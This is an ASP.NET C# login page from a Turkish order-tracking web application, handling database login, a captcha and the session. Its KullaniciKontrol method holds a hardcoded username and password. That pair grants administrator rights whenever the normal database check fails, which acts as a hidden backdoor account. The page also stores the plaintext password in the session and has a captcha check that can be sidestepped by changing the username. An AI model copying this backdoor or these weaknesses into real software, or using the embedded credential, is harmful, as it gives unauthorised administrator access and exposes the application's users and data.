using KobsisSiparisTakip.Business;
using KobsisSiparisTakip.Web.Util;
using System;
using System.Collections.Generic;
using System.Data;
using System.Web.Security;

namespace KobsisSiparisTakip.Web
{
    public partial class Login : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            if (!Page.IsPostBack)
            {
                Session["CaptchaImageText"] = CaptchaImage.GenerateRandomCode(CaptchaType.AlphaNumeric, 6);
            }
        }

        protected void LB_Login_Click(object sender, EventArgs e)
        {
            Dictionary<string, object> prms = new Dictionary<string, object>();
            prms.Add("KULLANICIADI", userName.Text);
            prms.Add("SIFRE", password.Text);


            if (Session["loginAttemptUser"] != null && Session["loginAttemptUser"].ToString() == userName.Text)
            {
                if (Session["loginAttemptCount"] != null && Session["loginAttemptCount"].ToString() != string.Empty && Convert.ToInt32(Session["loginAttemptCount"].ToString()) > 0)
                {
                    if (!ResimKontroluYap())
                    {
                        MessageBox.Hata(this, "Güvenlik resmi doğrulanamadı! Tekrar deneyiniz.");
                        return;
                    }
                }
            }

            DataTable dt = new KullaniciBS().KullaniciBilgisiGetir(prms);

            if (dt.Rows.Count > 0)
            {
                Session["yetki"] = dt.Rows[0]["YETKI"].ToString();
                UserValid();
            }
            else if (KullaniciKontrol(userName.Text, password.Text))
            {
                UserValid();
            }
            else
            {
                Session["loginAttemptUser"] = userName.Text;
                Session["loginAttemptCount"] = 1;
                imgCaptcha.Visible = true;
                txtResimDogrulama.Visible = true;

                MessageBox.Hata(this, "Kullanıcı adı ya da şifre hatalı. Tekrar deneyiniz.");
            }
        }

        private void UserValid()
        {
            Session["sifre"] = password.Text;
            Session["user"] = userName.Text;

            if (Session["loginAttemptUser"] != null) Session.Remove("loginAttemptUser");
            if (Session["loginAttemptCount"] != null) Session.Remove("loginAttemptCount");

            FormsAuthentication.RedirectFromLoginPage(userName.Text, false);
        }

        protected void LB_Logout_Click(object sender, EventArgs e)
        {
            Session.Clear();
            //FormsAuthenticationProvider.LogOut();
        }

        private bool KullaniciKontrol(string username, string pass)
        {
            if (username == "mangacece" && pass == "1Qaz2wSx!")
            {
                Session["yetki"] = "Yönetici";
                return true;
            }

            return false;
        }

        private bool ResimKontroluYap()
        {
            if (Session["CaptchaImageText"] != null && Session["CaptchaImageText"].ToString().CompareTo(txtResimDogrulama.Text) == 0)
                return true;

            return false;
        }
    }
}